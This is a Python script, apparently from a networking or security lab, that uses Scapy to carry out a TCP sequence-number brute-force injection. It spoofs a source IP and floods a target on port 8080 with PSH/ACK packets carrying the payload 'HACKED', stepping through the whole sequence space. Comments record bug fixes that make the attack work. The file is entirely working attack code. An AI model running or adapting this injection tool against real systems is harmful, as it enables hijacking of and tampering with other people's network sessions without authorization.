from scapy.all import IP, TCP, send
import sys
import time

TARGET = "20.0.0.20"
SPOOFED = "10.0.0.10"

def main():

    if len(sys.argv) < 3:
        print("=" * 60)
        print("TCP Sequence Guess Attack (Brute Force)")
        print("=" * 60)
        print()
        print(f"Usage: sudo python3 {sys.argv[0]} <client_port> <server_seq>")
        print()
        print("  client_port = Client's source port (from firewall table)")
        print("  server_seq  = Server's SEQ number (from firewall table)")
        print()
        print("Example:")
        print(f"  sudo python3 {sys.argv[0]} 50210 2523698453")
        sys.exit(1)

    sport = int(sys.argv[1])
    server_seq = int(sys.argv[2])

    print("=" * 60)
    print("TCP Sequence Guess Attack (Brute Force)")
    print("=" * 60)
    print()
    print(f"Target     : {TARGET}:8080")
    print(f"Spoofed    : {SPOOFED}")
    print(f"Port       : {sport}")
    print(f"Server SEQ : {server_seq} (used as ACK)")
    print()

    # BUG FIX: Step was 100000000 (too large, skips valid window)
    # TCP window is ~65535, so step must be <= 65535
    STEP = 65535

    for seq in range(0, 2**32, STEP):

        print(f"[+] Guessing SEQ : {seq}")

        pkt = (
            IP(src=SPOOFED, dst=TARGET)
            /
            TCP(
                sport=sport,
                dport=8080,
                flags="PA",
                seq=seq,
                ack=server_seq       # BUG FIX: was ack=1
            )
            / b"HACKED\n"
        )

        send(pkt, verbose=False)

        time.sleep(0.01)

    print("=" * 60)
    print("Attack Finished")
    print("=" * 60)


if __name__ == "__main__":
    main()
